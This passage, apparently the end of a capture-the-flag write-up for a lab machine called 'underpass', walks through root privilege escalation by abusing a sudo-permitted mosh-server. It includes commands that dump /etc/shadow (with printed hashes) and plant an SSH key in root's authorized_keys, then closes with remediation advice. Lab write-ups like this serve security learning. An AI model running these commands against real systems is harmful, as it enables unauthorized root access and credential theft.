+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>3</span> root    root    <span style=color:#ae81ff>4096</span> Dec <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2024</span> ../
+</span></span><span style=display:flex><span>lrwxrwxrwx <span style=color:#ae81ff>1</span> root    root       <span style=color:#ae81ff>9</span> Sep <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2024</span> .bash_history -&gt; /dev/null
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> svcMosh svcMosh  <span style=color:#ae81ff>220</span> Sep  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2024</span> .bash_logout
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> svcMosh svcMosh <span style=color:#ae81ff>3771</span> Sep  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2024</span> .bashrc
+</span></span><span style=display:flex><span>drwx------ <span style=color:#ae81ff>2</span> svcMosh svcMosh <span style=color:#ae81ff>4096</span> Dec <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2024</span> .cache/
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>3</span> svcMosh svcMosh <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>11</span> 13:27 .local/
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> svcMosh svcMosh  <span style=color:#ae81ff>807</span> Sep  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2024</span> .profile
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>2</span> svcMosh svcMosh <span style=color:#ae81ff>4096</span> Dec <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2024</span> .ssh/
+</span></span><span style=display:flex><span>-rw-r----- <span style=color:#ae81ff>1</span> root    svcMosh   <span style=color:#ae81ff>33</span> Jun <span style=color:#ae81ff>23</span> 21:49 user.txt
+</span></span><span style=display:flex><span>svcMosh@underpass:~$ cat user.txt
+</span></span><span style=display:flex><span>50df3553e04f627ecxxxxxxxxxxxxxxx
+</span></span></code></pre></div><h3 id=getting-root>Getting Root</h3><p>Doing a first-step enum shows we can run <code>sudo</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>svcMosh@underpass:~$ sudo -l
+</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> svcMosh on localhost:
+</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin, use_pty
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User svcMosh may run the following commands on localhost:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/mosh-server
+</span></span></code></pre></div><p>After a bit of research - mosh-server is intended to sync up with mosh-client. It&rsquo;s intended to be an ssh alternative especially for high latency servers. A quick glance in the man file also tells us that it can be programmed to run a command when triggered.</p><p>In other words, we&rsquo;ve got our privesc path. We can craft a privileged command to run when we connect to the server:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>svcMosh@underpass:~$  sudo /usr/bin/mosh-server new -p <span style=color:#ae81ff>1337</span> -- sh -c <span style=color:#e6db74>&#39;cat /etc/shadow &gt; /tmp/shadowdump &amp;&amp; chmod 644 /tmp/shadowdump&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>MOSH CONNECT <span style=color:#ae81ff>1337</span> j+kvuhgaEXpBr5A3xlVXYQ
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mosh-server <span style=color:#f92672>(</span>mosh 1.3.2<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>build mosh 1.3.2<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Copyright <span style=color:#ae81ff>2012</span> Keith Winstein &lt;mosh-devel@mit.edu&gt;
+</span></span><span style=display:flex><span>License GPLv3+: GNU GPL version <span style=color:#ae81ff>3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;.
+</span></span><span style=display:flex><span>This is free software: you are free to change and redistribute it.
+</span></span><span style=display:flex><span>There is NO WARRANTY, to the extent permitted by law.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>mosh-server detached, pid <span style=color:#f92672>=</span> 4081<span style=color:#f92672>]</span>
+</span></span></code></pre></div><p>With mosh-client installed on our attacker machine, we can now use the key provided by the server to connect and execute the payload.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ MOSH_KEY<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;j+kvuhgaEXpBr5A3xlVXYQ&#39;</span> mosh-client 10.129.231.213 <span style=color:#ae81ff>1337</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>mosh is exiting.<span style=color:#f92672>]</span>
+</span></span></code></pre></div><p>Checking /tmp:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>svcMosh@underpass:~$ cat /tmp/shadowdump
+</span></span><span style=display:flex><span>root:$y$j9T$y6GVl9yuguP9lhnKmS04c.$pzmkCXRNa/BCrMpnOUxIWUbVR905YSEHwW20O40wEaA:20057:0:99999:7:::
+</span></span><span style=display:flex><span>daemon:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>bin:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>sys:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>sync:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>games:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>man:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>lp:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>mail:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>news:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>uucp:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>proxy:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>www-data:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>backup:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>list:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>irc:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>gnats:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>nobody:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>_apt:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>systemd-network:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>systemd-resolve:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>messagebus:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>systemd-timesync:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>pollinate:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>sshd:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>syslog:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>uuidd:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>tcpdump:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>tss:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>landscape:*:19103:0:99999:7:::
+</span></span><span style=display:flex><span>usbmux:*:19949:0:99999:7:::
+</span></span><span style=display:flex><span>lxd:!:19949::::::
+</span></span><span style=display:flex><span>fwupd-refresh:*:19959:0:99999:7:::
+</span></span><span style=display:flex><span>freerad:*:19963:0:99999:7:::
+</span></span><span style=display:flex><span>mysql:!:19964:0:99999:7:::
+</span></span><span style=display:flex><span>Debian-snmp:!:19964:0:99999:7:::
+</span></span><span style=display:flex><span>tftp:*:19970:0:99999:7:::
+</span></span><span style=display:flex><span>svcMosh:$y$j9T$cK5jfCW.c6g5yvOzPF5iF1$E0geEsKPdNSCLj2wVbvftMGkbs.uJL7B0ADA41Q8Y08:20067:0:99999:7:::
+</span></span><span style=display:flex><span>_laurel:!:20068::::::
+</span></span></code></pre></div><p>We can now do anything as root. Let&rsquo;s write our ssh key into root&rsquo;s authorized_keys files so we can get SSH access:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo /usr/bin/mosh-server new -p <span style=color:#ae81ff>1337</span> -- sh -c <span style=color:#e6db74>&#39;mkdir -p /root/.ssh &amp;&amp; echo &#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBvuBDwumAevSydWICpgT28gq8GgoYklpQ4YqDb54uLs&#34; &gt; /root/.ssh/authorized_keys &amp;&amp; chmod 600 /root/.ssh/authorized_keys &amp;&amp; chmod 700 /root/.ssh&#39;</span>
+</span></span></code></pre></div><p>The permission changes are to make sure that the permissions on the directory and authorized_keys files are adequately protected; otherwise SSH won&rsquo;t use them.</p><p>And we&rsquo;re root:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ ssh root@underpass
+</span></span><span style=display:flex><span>Welcome to Ubuntu 22.04.5 LTS <span style=color:#f92672>(</span>GNU/Linux 5.15.0-126-generic x86_64<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
+</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/pro
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> System information as of Tue Jun <span style=color:#ae81ff>24</span> 03:06:46 AM UTC <span style=color:#ae81ff>2025</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System load:  0.02              Processes:             <span style=color:#ae81ff>228</span>
+</span></span><span style=display:flex><span>  Usage of /:   54.1% of 6.56GB   Users logged in:       <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>  Memory usage: 15%               IPv4 address <span style=color:#66d9ef>for</span> eth0: 10.129.231.213
+</span></span><span style=display:flex><span>  Swap usage:   0%
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Expanded Security Maintenance <span style=color:#66d9ef>for</span> Applications is not enabled.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span> updates can be applied immediately.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Enable ESM Apps to receive additional future security updates.
+</span></span><span style=display:flex><span>See https://ubuntu.com/esm or run: sudo pro status
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>The list of available updates is more than a week old.
+</span></span><span style=display:flex><span>To check <span style=color:#66d9ef>for</span> new updates run: sudo apt update
+</span></span><span style=display:flex><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Last login: Wed Jan  <span style=color:#ae81ff>8</span> 16:29:58 <span style=color:#ae81ff>2025</span>
+</span></span><span style=display:flex><span>root@underpass:~# cat /root/root.txt
+</span></span><span style=display:flex><span>4886c9afa327d2714xxxxxxxxxxxxxxx
+</span></span><span style=display:flex><span>root@underpass:~#
+</span></span></code></pre></div><h3 id=closing-the-vulnerability>Closing the Vulnerability</h3><ul><li>When designing software, never include default credentials. Always have the user set their own credentials where possible.</li><li>On systems that do use default credentials, change the password immediately after logging in for the first time.</li><li>Don&rsquo;t display user passwords or password hashes to other users (seriously, daloradius???)</li><li>Be careful about giving users sudo permissions</li></ul><h3 id=key-penetration-testing-takeaways>Key Penetration Testing Takeaways</h3><ul><li>Sometimes, a UDP scan isn&rsquo;t completely useless.</li><li>Enumerate harder.</li><li>Running a local copy of an open source piece of software can be helpful to find exploit paths.</li><li>Sudo is your friend.</li></ul></div></article></div><script src=/lightbox.js></script></body></html>
